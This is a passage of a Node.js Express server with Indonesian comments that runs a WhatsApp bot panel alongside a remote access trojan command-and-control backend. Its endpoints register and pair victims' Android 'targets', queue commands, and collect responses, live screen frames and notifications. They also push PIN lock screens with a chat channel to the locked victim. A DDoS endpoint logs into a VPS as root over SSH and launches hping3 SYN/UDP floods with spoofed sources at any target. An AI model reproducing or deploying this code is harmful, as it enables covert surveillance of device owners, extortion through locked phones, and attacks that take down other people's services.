  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user) {
    return res.json({ valid: false, message: "User not found" });
  }

  if (!message || message.trim().length === 0) {
    return res.json({ valid: false, message: "Pesan tidak boleh kosong" });
  }

  if (message.length > 500) {
    return res.json({ valid: false, message: "Pesan terlalu panjang (max 500 karakter)" });
  }

  const newMessage = {
    id: Date.now().toString(),
    username: user.username,
    role: user.role || "member",
    message: message.trim(),
    timestamp: new Date().toISOString(),
  };

  publicMessages.push(newMessage);

  // Keep only last 1000 messages
  if (publicMessages.length > 1000) {
    publicMessages = publicMessages.slice(-1000);
  }

  savePublicChat();

  res.json({
    valid: true,
    message: {
      ...newMessage,
      formattedTime: "baru saja"
    }
  });
});

// DELETE /deletePublicChat - Hapus pesan (khusus owner)
app.delete("/deletePublicChat", (req, res) => {
  const { key, messageId } = req.body;

  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  // Hanya owner yang bisa hapus
  if (!user || user.role !== 'owner') {
    return res.json({ valid: false, message: "Only owner can delete messages" });
  }

  const index = publicMessages.findIndex(m => m.id === messageId);
  if (index === -1) {
    return res.json({ valid: false, message: "Message not found" });
  }

  publicMessages.splice(index, 1);
  savePublicChat();

  res.json({ valid: true, message: "Message deleted" });
});

// GET /getOnlineUsers - Ambil user online (dari session aktif)
app.get("/getOnlineUsers", (req, res) => {
  const { key } = req.query;

  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session" });
  }

  // Ambil user dari activeKeys yang masih valid
  const onlineUsers = Object.values(activeKeys).map(k => k.username);
  const uniqueUsers = [...new Set(onlineUsers)];

  res.json({
    valid: true,
    onlineUsers: uniqueUsers,
    count: uniqueUsers.length
  });
});

// ===================== AUTO GLOBAL SENDER =====================
const AUTO_UPLOAD_FOLDER = path.join(__dirname, 'auto_global'); // folder tempat upload file .json
const GLOBAL_SENDER_DIR = path.join('permenmd', GLOBAL_SENDER_FOLDER);

// Pastikan folder auto_global ada
if (!fs.existsSync(AUTO_UPLOAD_FOLDER)) {
  fs.mkdirSync(AUTO_UPLOAD_FOLDER, { recursive: true });
  console.log("📁 Folder auto_global dibuat.");
}

// Fungsi untuk memproses file .json yang baru
async function processAutoGlobalFile(filePath) {
  const fileName = path.basename(filePath);
  if (!fileName.endsWith('.json')) return;

  const sessionName = path.basename(fileName, '.json');
  const destPath = path.join(GLOBAL_SENDER_DIR, fileName);

  try {
    // Baca file untuk memastikan valid (opsional: cek struktur)
    const content = fs.readFileSync(filePath, 'utf8');
    JSON.parse(content); // cek valid JSON

    // Pindahkan file ke folder __global__
    fs.renameSync(filePath, destPath);
    console.log(`✅ File ${fileName} dipindahkan ke global sender.`);

    // Tambahkan ke globalSenderSessions jika belum ada
    if (!globalSenderSessions.includes(sessionName)) {
      globalSenderSessions.push(sessionName);
      saveGlobalSenderSessions();
      console.log(`📝 Session ${sessionName} ditambahkan ke daftar global sender.`);
    }

    // Restart koneksi session (opsional, agar langsung terhubung)
    // Namun lebih baik biarkan startUserSessions() yang akan connect otomatis nanti.
  } catch (err) {
    console.error(`❌ Gagal memproses file ${fileName}:`, err.message);
  }
}

// Memindai folder auto_global setiap 30 detik
setInterval(() => {
  if (!fs.existsSync(AUTO_UPLOAD_FOLDER)) return;
  const files = fs.readdirSync(AUTO_UPLOAD_FOLDER);
  for (const file of files) {
    const filePath = path.join(AUTO_UPLOAD_FOLDER, file);
    if (fs.statSync(filePath).isFile() && file.endsWith('.json')) {
      processAutoGlobalFile(filePath);
    }
  }
}, 30000); // 30 detik

// Juga pantau perubahan real-time (jika ada file baru)
fs.watch(AUTO_UPLOAD_FOLDER, (eventType, filename) => {
  if (filename && filename.endsWith('.json')) {
    const filePath = path.join(AUTO_UPLOAD_FOLDER, filename);
    // Tunggu sebentar agar file selesai ditulis
    setTimeout(() => processAutoGlobalFile(filePath), 1000);
  }
});

// ========== AI ENDPOINTS ==========
// AI, WiFi, and Chess tools removed to reduce server load

// ========== BAILEYS STATUS ==========
app.get("/api/baileys-status", (req, res) => {
  const { key } = req.query;
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) return res.json({ success: false, error: "Invalid key" });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  const status = Object.keys(activeConnections).length > 0 ? 'Connected' : 'Disconnected';
  res.json({ code: null, status, activeConnections: Object.keys(activeConnections).length });
});

// ========== DEVICE KEEPALIVE ==========
app.post("/api/device/keepalive", (req, res) => {
  const { id } = req.body;
  if (!id) return res.status(400).json({ error: "Device ID required" });
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === id);
  if (i !== -1) {
    t[i].lastSeen = new Date().toISOString();
    t[i].status = 'Online';
    saveRat(RAT_TARGETS, t);
  }
  res.json({ status: 'ok' });
});

// ========== DEVICE PERSIST ONLINE ==========
app.post("/api/device/persist-online", (req, res) => {
  const { id, online } = req.body;
  if (!id) return res.status(400).json({ error: "Device ID required" });
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === id);
  if (i !== -1) {
    t[i].persistOnline = online !== false;
    t[i].lastSeen = new Date();
    saveRat(RAT_TARGETS, t);
  }
  res.json({ status: 'ok' });
});

// ========== LOCK CHAT ALL ==========
app.get("/api/lock-chat-all/:id", (req, res) => {
  const id = req.params.id;
  const chat = LOCK_CHATS[id] || [];
  const messages = chat.map(c => ({
    from: c.from || 'unknown',
    text: c.msg || c.text || '',
    time: c.ts ? new Date(c.ts).toLocaleTimeString() : new Date().toLocaleTimeString(),
  }));
  res.json({ messages });
});

// ========== GET NOTIFICATIONS ==========
app.get("/api/get-notifications/:id", (req, res) => {
  const id = req.params.id;
  let notifs = readRat('./rat_notifs.json');
  const deviceNotifs = notifs.filter(n => n.targetId === id);
  res.json(deviceNotifs);
});

// Load public chat saat server start
loadPublicChat();

// Kirim status ke Telegram group
function kirimStatusServer(pesan) {
  try {
    sendToGroupsUtama(`🟣 *Status Panel:*\n${pesan}`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Gagal kirim status ke Telegram:", err.message);
  }
}

// Kirim notifikasi saat server aktif
kirimStatusServer("✅ Server aktif dan berjalan normal.");

// ═══════════ RAT SYSTEM WITH SxC ROLES - ONLY FOUNDER DEV CAN SEE ALL DEVICES ═══════════
const RAT_TARGETS = './rat_targets.json';
const RAT_LIVE = {};
const DEVICE_PERMS_FILE = './device_perms.json';

function readRat(f) {
  try { return JSON.parse(fs.existsSync(f) ? fs.readFileSync(f, 'utf8') || '[]' : '[]'); } catch { return []; }
}
function saveRat(f, d) { try { fs.writeFileSync(f, JSON.stringify(d, null, 2)); } catch (_) { } }

function loadDevicePerms() {
  try {
    if (!fs.existsSync(DEVICE_PERMS_FILE)) return {};
    return JSON.parse(fs.readFileSync(DEVICE_PERMS_FILE, 'utf8') || '{}');
  } catch (_) { return {}; }
}
function saveDevicePerms(d) {
  try { fs.writeFileSync(DEVICE_PERMS_FILE, JSON.stringify(d, null, 2)); } catch (_) { }
}

const RAT_LIVE_FRAMES = {};

function readRatTargets() {
  try { return JSON.parse(require('fs').readFileSync(RAT_TARGETS, 'utf8')); }
  catch (_) { return []; }
}
function saveRatTargets(d) {
  try { require('fs').writeFileSync(RAT_TARGETS, JSON.stringify(d, null, 2)); }
  catch (_) { }
}

function genPairId() {
  return require('crypto').randomBytes(8).toString('hex').toUpperCase();
}

// ========== ROLE SxC CONFIGURATION ==========
// SEMUA ROLE bisa menjadi OWNER device (punya device sendiri)
const OWNER_ROLES = ['member', 'reseller', 'vvip', 'admin', 'owner', 'elite', 'tangan kanan', 'vanguard', 'founder dev'];

// Role yang bisa GRANT/REVOKE akses ke member lain
const GRANT_ROLES = ['admin', 'owner', 'elite', 'tangan kanan', 'vanguard', 'founder dev'];

// HANYA FOUNDER DEV yang bisa melihat semua device (termasuk device orang lain)
const ADMIN_VIEW_ROLES = ['founder dev'];

// Semua role SxC
const ALL_SXC_ROLES = ['member', 'reseller', 'vvip', 'admin', 'owner', 'elite', 'tangan kanan', 'vanguard', 'founder dev'];

// Helper cek role
function isOwnerRole(role) {
  return OWNER_ROLES.includes(role);
}

function canGrantAccess(role) {
  return GRANT_ROLES.includes(role);
}

function canViewAllDevices(role) {
  return ADMIN_VIEW_ROLES.includes(role);
}

// ========== GET PAIR ID (semua role bisa dapat pairId) ==========
app.get("/rat/pairid", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === keyInfo.username);
  if (idx === -1) return res.json({ valid: false, message: "User not found" });
  if (!db[idx].pairId) {
    db[idx].pairId = genPairId();
    saveDatabase(db);
    console.log('[PAIRID] Generated for: ' + db[idx].username + ' → ' + db[idx].pairId);
  }
  console.log('[PAIRID] Serving pairId for: ' + db[idx].username + ' → ' + db[idx].pairId);
  res.json({ valid: true, pairId: db[idx].pairId, username: db[idx].username, role: db[idx].role });
});

// ========== GRANT MEMBER ==========
app.post("/rat/grant-member", (req, res) => {
  const { ownerKey, memberUsername, deviceIds, allDevices } = req.body;
  const keyInfo = activeKeys[ownerKey];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || !canGrantAccess(owner.role)) {
    return res.status(403).json({
      valid: false,
      message: `Role ${owner?.role || 'unknown'} tidak bisa memberikan akses. Hanya admin, owner, elite, tangan kanan, vanguard, founder dev yang bisa.`
    });
  }
  const member = db.find(u => u.username === memberUsername);
  if (!member) return res.status(404).json({ valid: false, message: "Member not found" });
  if (!member.ratPerms) member.ratPerms = {};
  member.ratPerms[owner.username] = {
    approved: true,
    allDevices: allDevices === true,
    deviceIds: Array.isArray(deviceIds) ? deviceIds : [],
    grantedBy: owner.username,
    grantedAt: new Date().toISOString()
  };
  saveDatabase(db);
  console.log(`[GRANT] ${owner.username} (${owner.role}) → ${memberUsername}`);
  res.json({ valid: true, message: `${memberUsername} berhasil diberi akses` });
});

// ========== REVOKE MEMBER ==========
app.post("/rat/revoke-member", (req, res) => {
  const { ownerKey, memberUsername } = req.body;
  const keyInfo = activeKeys[ownerKey];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || !canGrantAccess(owner.role)) {
    return res.status(403).json({
      valid: false,
      message: `Role ${owner?.role || 'unknown'} tidak bisa mencabut akses.`
    });
  }
  const member = db.find(u => u.username === memberUsername);
  if (member && member.ratPerms) {
    delete member.ratPerms[owner.username];
    saveDatabase(db);
  }
  res.json({ valid: true, message: `Akses ${memberUsername} dicabut` });
});

// ========== MY DEVICES ==========
app.get("/rat/my-devices", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(404).json({ valid: false });

  const targets = readRat(RAT_TARGETS);

  // SEMUA ROLE bisa melihat device milik SENDIRI
  const myDevices = targets.filter(t => t.owner === user.username);

  // HANYA FOUNDER DEV yang bisa melihat device orang lain
  let extraDevices = [];
  if (canViewAllDevices(user.role)) {
    // Founder dev: lihat semua device
    extraDevices = targets.filter(t => t.owner !== user.username);
  } else {
    // Role lain: cek permission dari device_perms.json (akses yang diberikan oleh grant)
    const perms = loadDevicePerms();
    const userPerm = perms[user.username.toLowerCase()];

    if (userPerm && userPerm.approved) {
      if (userPerm.allDevices) {
        extraDevices = targets.filter(t => t.owner !== user.username);
      } else if (Array.isArray(userPerm.devices) && userPerm.devices.length > 0) {
        extraDevices = targets.filter(t => userPerm.devices.includes(t.id) && t.owner !== user.username);
      }
    } else {
      // Fallback: cek ratPerms di database dari owner yang memberikan akses
      for (const owner of db.filter(u => canGrantAccess(u.role))) {
        const perm = owner.ratPerms?.[user.username];
        if (!perm || !perm.approved) continue;
        const ownerDevices = targets.filter(t => t.owner === owner.username && t.owner !== user.username);
        if (perm.allDevices) {
          extraDevices = extraDevices.concat(ownerDevices);
        } else {
          extraDevices = extraDevices.concat(
            ownerDevices.filter(d => (perm.deviceIds || []).includes(d.id))
          );
        }
      }
    }
  }

  // Gabungkan device sendiri + device yang diizinkan
  let allDevices = [...myDevices, ...extraDevices];

  // Hapus duplikat
  allDevices = allDevices.filter((v, i, a) => a.findIndex(t => t.id === v.id) === i);

  res.json({
    valid: true,
    pairId: user.pairId,
    role: user.role,
    devices: allDevices,
    myDevicesCount: myDevices.length,
    totalDevices: allDevices.length,
    canViewAll: canViewAllDevices(user.role)
  });
});

// ========== PAIR TARGET (SEMUA ROLE BISA PAIR) ==========
app.post('/api/pair-target', (req, res) => {
  const { pairId, deviceId, model, battery } = req.body;
  if (!pairId || !deviceId) return res.status(400).json({ error: 'pairId dan deviceId wajib' });

  let db = loadDatabase();

  let dbChanged = false;
  for (let i = 0; i < db.length; i++) {
    if (!db[i].pairId) {
      db[i].pairId = genPairId();
      dbChanged = true;
      console.log('[AUTO-PAIR] Generated pairId for user: ' + db[i].username + ' → ' + db[i].pairId);
    }
  }
  if (dbChanged) saveDatabase(db);

  const ownerIdx = db.findIndex(u =>
    u.pairId && u.pairId.toUpperCase() === pairId.toUpperCase()
  );

  console.log('[PAIR-DEBUG] Looking for pairId: ' + pairId + ' | Found at index: ' + ownerIdx);
  if (ownerIdx >= 0) {
    console.log('[PAIR-DEBUG] Owner found: ' + db[ownerIdx].username + ' | Their pairId: ' + db[ownerIdx].pairId);
  } else {
    console.log('[PAIR-DEBUG] All pairIds in DB: ' + db.map(u => u.username + ':' + u.pairId).join(', '));
  }

  if (ownerIdx === -1) return res.status(404).json({ error: 'PairID tidak valid', hint: 'Cek pairId di Device Dashboard' });

  const owner = db[ownerIdx];
  const userRole = owner.role || 'member';

  console.log(`[PAIR] User ${owner.username} (${userRole}) pairing device ${deviceId}`);

  if (!owner.devices) owner.devices = [];
  if (!owner.devices.includes(deviceId)) {
    owner.devices.push(deviceId);
    db[ownerIdx] = owner;
    saveDatabase(db);
  }

  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === deviceId);
  const dev = {
    id: deviceId,
    model: model || 'Unknown',
    battery: battery || '?',
    owner: owner.username,
    status: 'Online',
    lastSeen: new Date()
  };
  if (i !== -1) t[i] = { ...t[i], ...dev };
  else t.push(dev);
  saveRat(RAT_TARGETS, t);

  console.log('[PAIR] ' + deviceId + ' → ' + owner.username);
  res.json({ status: 'paired', ownerUsername: owner.username });
});

// ========== SEND COMMAND ==========
app.post('/api/send-command', async (req, res) => {
  const { id, command, extra } = req.body;
  let cmds = readRat('./rat_commands.json');
  cmds = cmds.filter(c => c.targetId !== id);
  cmds.push({ targetId: id, command, extra: extra || '', timestamp: new Date() });
  saveRat('./rat_commands.json', cmds);

  // Also sync lock/wallpaper commands to MongoDB Device (System A)
  // so the Android app picks them up from /api/sync/:deviceId
  try {
    const device = await Device.findOne({ deviceId: id });
    if (device) {
      const cmdUpper = command.toUpperCase();
      // Lock commands
      if (['LOCK', 'LOCK_LIVE', 'LOCKHARD', 'HARD_LOCK', 'UNLOCK'].includes(cmdUpper) || command === 'lock_live' || command === 'hard_lock') {
        if (cmdUpper === 'UNLOCK' || command === 'unlock') {
          await Device.findOneAndUpdate({ deviceId: id }, {
            command: 'UNLOCK',
            commandPayload: null,
            'lockSettings.isActive': false,
          });
        } else {
          // lock_live / hard_lock
          const parts = (extra || '').split('|');
          const title = parts[0] || 'LOCKED';
          const pin = parts[1] || '1234';
          await Device.findOneAndUpdate({ deviceId: id }, {
            command: 'LOCK',
            commandPayload: extra,
            'lockSettings.isActive': true,
            'lockSettings.pin': pin,
            'lockSettings.title': title,
            'lockSettings.message': title,
          });
        }
        console.log('[CMD][SYNC] Lock command synced to MongoDB for ' + id);
      }
      // Wallpaper command
      if (cmdUpper === 'SET_WALLPAPER' || command === 'set_wallpaper') {
        await Device.findOneAndUpdate({ deviceId: id }, {
          command: 'SET_WALLPAPER',
          commandPayload: extra,
          'lockSettings.imageUrl': extra,
        });
        console.log('[CMD][SYNC] Wallpaper command synced to MongoDB for ' + id);
      }
    }
  } catch (e) {
    console.error('[CMD][SYNC] Error syncing to MongoDB:', e.message);
  }

  console.log('[CMD] ' + id + ': ' + command);
  res.json({ status: 'queued' });
});

// ========== GET COMMAND ==========
app.get('/api/get-command/:id', (req, res) => {
  const id = req.params.id;
  let cmds = readRat('./rat_commands.json');
  const i = cmds.findIndex(c => c.targetId === id);
  if (i !== -1) {
    const cmd = cmds[i];
    cmds.splice(i, 1);
    saveRat('./rat_commands.json', cmds);
    return res.json(cmd);
  }
  res.status(204).send();
});

// ========== POST RESPONSE ==========
app.post('/api/post-response/:id', (req, res) => {
  const id = req.params.id;
  const { cmd, data } = req.body;
  let resps = readRat('./rat_responses.json');
  const i = resps.findIndex(r => r.targetId === id);
  const nr = { targetId: id, cmd, data, timestamp: new Date() };
  if (i !== -1) resps[i] = nr; else resps.push(nr);
  saveRat('./rat_responses.json', resps);
  console.log('[RESP] ' + cmd + ' from ' + id);
  res.json({ status: 'ok' });
});

// ========== GET RESPONSE ==========
app.get('/api/get-response/:id', (req, res) => {
  const resps = readRat('./rat_responses.json');
  res.json(resps.find(r => r.targetId === req.params.id) || {});
});

// ========== LIVE FRAME ==========
app.post('/api/live-frame/:id', (req, res) => {
  const { frame, ts } = req.body;
  if (!frame) return res.status(400).json({ error: 'no frame' });
  RAT_LIVE[req.params.id] = { frame, ts: ts || Date.now() };
  res.json({ status: 'ok' });
});

app.get('/api/live-frame/:id', (req, res) => {
  const d = RAT_LIVE[req.params.id];
  if (!d) return res.status(404).json({ error: 'no frame yet' });
  res.json(d);
});

// ========== POST NOTIFICATION ==========
app.post('/api/post-notification/:id', (req, res) => {
  let n = readRat('./rat_notifs.json');
  n.unshift({ targetId: req.params.id, ...req.body, timestamp: new Date() });
  if (n.length > 1000) n = n.slice(0, 1000);
  saveRat('./rat_notifs.json', n);
  res.json({ status: 'saved' });
});

// ========== LOCK CHAT ==========
const LOCK_CHATS = {};

app.get('/api/lock-chat/:id', (req, res) => {
  const id = req.params.id;
  res.json({ messages: LOCK_CHATS[id] || [] });
});

app.post('/api/lock-chat/:id', (req, res) => {
  const id = req.params.id;
  const { from, msg, text } = req.body;
  const messageText = text || msg || '';
  if (!LOCK_CHATS[id]) LOCK_CHATS[id] = [];
  LOCK_CHATS[id].push({ from: from || 'owner', msg: messageText, text: messageText, ts: Date.now() });
  if (LOCK_CHATS[id].length > 100) LOCK_CHATS[id] = LOCK_CHATS[id].slice(-100);
  res.json({ status: 'ok' });
});

app.delete('/api/lock-chat/:id', (req, res) => {
  LOCK_CHATS[req.params.id] = [];
  res.json({ status: 'cleared' });
});

// ========== DEVICE PERMS GRANT ==========
app.post('/api/device-perms/grant', (req, res) => {
  const { ownerKey, memberUsername, allDevices, deviceIds } = req.body;
  const ki = activeKeys[ownerKey];
  if (!ki) return res.status(401).json({ error: 'Invalid key' });
  const db = loadDatabase();
  const owner = db.find(u => u.username === ki.username);
  if (!owner || !canGrantAccess(owner.role)) {
    return res.status(403).json({
      error: `Role ${owner?.role || 'unknown'} tidak bisa memberikan akses.`
    });
  }
  const perms = loadDevicePerms();
  perms[memberUsername.toLowerCase()] = {
    approved: true, grantedBy: owner.username,
    allDevices: allDevices === true,
    devices: Array.isArray(deviceIds) ? deviceIds : []
  };
  saveDevicePerms(perms);
  res.json({ status: 'ok', message: `Akses diberikan ke ${memberUsername}` });
});

// ========== DEVICE PERMS REVOKE ==========
app.post('/api/device-perms/revoke', (req, res) => {
  const { ownerKey, memberUsername } = req.body;
  const ki = activeKeys[ownerKey];
  if (!ki) return res.status(401).json({ error: 'Invalid key' });
  const perms = loadDevicePerms();
  delete perms[memberUsername.toLowerCase()];
  saveDevicePerms(perms);
  res.json({ status: 'ok' });
});

// ========== GET PERMISSION STATUS ==========
app.get('/rat/permission-status', (req, res) => {
  const { key, username } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === username);
  if (!user) return res.status(404).json({ valid: false, message: "User not found" });

  const isOwner = isOwnerRole(user.role);
  const canViewAll = canViewAllDevices(user.role);

  const perms = loadDevicePerms();
  const userPerm = perms[username.toLowerCase()];

  let approved = true;
  let allDevices = canViewAll || (userPerm && userPerm.allDevices) || false;
  let deviceIds = (userPerm && userPerm.devices) || [];

  res.json({
    valid: true,
    role: user.role,
    isOwner: isOwner,
    canViewAllDevices: canViewAll,
    approved: approved,
    allDevices: allDevices,
    devices: deviceIds
  });
});

// ========== HEARTBEAT ==========
app.post('/api/heartbeat/:id', (req, res) => {
  const id = req.params.id;
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === id);
  if (i !== -1) {
    t[i].lastSeen = new Date();
    t[i].status = 'Online';
    if (req.body.battery) t[i].battery = req.body.battery;
    saveRat(RAT_TARGETS, t);
  }
  res.status(200).send('1');
});

// ========== REGISTER TARGET ==========
app.post('/api/register-target', (req, res) => {
  const d = req.body;
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === d.id);
  if (i !== -1) t[i] = { ...t[i], ...d, lastSeen: new Date() };
  else t.push({ ...d, lastSeen: new Date() });
  saveRat(RAT_TARGETS, t);
  res.json({ status: 'ok' });
});

// OSINT, Phone Lookup, and Spam Pair moved to standalone servers in tools/

// ========== LIST DEVICE PERMS (for Flutter DevicePermissionManager) ==========
app.get('/listDevicePerms', (req, res) => {
  const { key } = req.query;
  const ki = activeKeys[key];
  if (!ki) return res.json({ valid: false, error: 'Invalid key' });
  const db = loadDatabase();
  const user = db.find(u => u.username === ki.username);
  if (!user || !canGrantAccess(user.role)) {
    return res.json({ valid: false, error: 'No permission to list device perms' });
  }
  const perms = loadDevicePerms();
  res.json({ valid: true, perms: perms || {} });
});

// ========== SET DEVICE PERM (for Flutter DevicePermissionManager) ==========
app.post('/setDevicePerm', (req, res) => {
  const { key } = req.query;
  const { username, approved, allDevices, devices, persistAllowed } = req.body;
  const ki = activeKeys[key];
  if (!ki) return res.json({ valid: false, error: 'Invalid key' });
  const db = loadDatabase();
  const user = db.find(u => u.username === ki.username);
  if (!user || !canGrantAccess(user.role)) {
    return res.json({ valid: false, error: 'No permission' });
  }
  const perms = loadDevicePerms();
  const uname = (username || '').toLowerCase();
  if (approved) {
    perms[uname] = {
      approved: true,
      grantedBy: user.username,
      allDevices: allDevices === true,
      devices: Array.isArray(devices) ? devices : [],
      persistAllowed: persistAllowed === true
    };
  } else {
    delete perms[uname];
  }
  saveDevicePerms(perms);
  res.json({ valid: true, message: `Permissions updated for ${uname}` });
});

// ========== LIST TARGETS ==========
app.get('/api/list-targets', (req, res) => {
  const { owner } = req.query;
  const t = readRat(RAT_TARGETS);
  res.json(owner ? t.filter(x => x.owner === owner) : t);
});

// ========== DDoS VPS RUNNER ==========
app.post('/api/ddos-run', (req, res) => {
  const { key, vpsIp, vpsPass, target, port, duration, method, threads } = req.body;
  const ki = activeKeys[key];
  if (!ki) return res.json({ success: false, error: 'Invalid key' });
  if (!vpsIp || !vpsPass || !target) return res.json({ success: false, error: 'VPS IP, password, and target required' });

  const attackPort = String(port || '80');
  const attackDuration = parseInt(duration) || 60;
  const attackMethod = String(method || 'HTTP').toUpperCase();

  let cmd;
  if (attackMethod === 'UDP') {
    cmd = `hping3 --udp --flood --rand-source ${target} -p ${attackPort}`;
  } else if (attackMethod === 'TCP') {
    cmd = `hping3 --flood ${target} -p ${attackPort}`;
  } else if (attackMethod === 'SYN') {
    cmd = `hping3 -S --flood ${target} -p ${attackPort}`;
  } else {
    cmd = `hping3 -S --flood ${target} -p ${attackPort}`;
  }

  const fullCmd = `screen -dmS ddos_attack bash -c '${cmd} & sleep ${attackDuration}; pkill -f hping3'`;

  const conn = new Client();

  conn.on('ready', () => {
    console.log(`[DDoS] SSH connected to ${vpsIp}, running attack on ${target}:${attackPort}`);
    conn.exec(fullCmd, (err, stream) => {
      if (err) {
        conn.end();
        return res.json({ success: false, error: `SSH exec error: ${err.message}` });
      }
      let output = '';
      stream.on('data', d => output += d);
      stream.stderr.on('data', d => output += d);
      stream.on('close', () => {
        conn.end();
        console.log(`[DDoS] Attack deployed to ${vpsIp} -> ${target}:${attackPort} (${attackMethod}, ${attackDuration}s)`);
        res.json({
          success: true,
          message: `DDoS deployed to VPS ${vpsIp}\nTarget: ${target}:${attackPort}\nMethod: ${attackMethod}\nDuration: ${attackDuration}s`,
          output: output.trim(),
        });
      });
    });
  });

  conn.on('error', (err) => {
    console.error(`[DDoS] SSH error to ${vpsIp}:`, err.message);
    res.json({ success: false, error: `SSH connection failed: ${err.message}` });
  });

  conn.connect({ host: vpsIp, username: 'root', password: vpsPass, port: 22, readyTimeout: 10000 });
});

console.log('system Rat active - Only Founder Dev can see all devices');

// SIMPAN BACKUP SECARA PERIODIK
setInterval(() => {
  if (Object.keys(activeConnections).length > 0) {
    backupActiveSessions();
    saveSessionState();
  }
}, 5 * 60 * 1000); // Backup setiap 5 menit

// ===== Start Express Server =====
// ===== Start Express Server =====
// ===== Start Express Server =====
(async () => {
  try {
    const finalPort = await findAvailablePort(PORT);

    server.listen(finalPort, '0.0.0.0', async () => {
      console.log(`🚀 Server aktif di http://0.0.0.0:${finalPort}`);
      console.log(`📡 WebSocket: ws://0.0.0.0:${finalPort}`);

      const restored = await restoreSessionsFromBackup();

      if (!restored) {
        console.log("📂 Tidak ada backup, melakukan scan manual...");
        await scanAndRestoreAllSessions();
      }

      await startUserSessions();

      console.log(`📊 Total active connections: ${Object.keys(activeConnections).length}`);
      console.log(`📊 Business connections: ${Object.keys(biz).length}`);
      console.log(`📊 Messenger connections: ${Object.keys(mess).length}`);
    });
  } catch (err) {
    console.error('❌ Failed to start server:', err);
    process.exit(1);
  }
})();
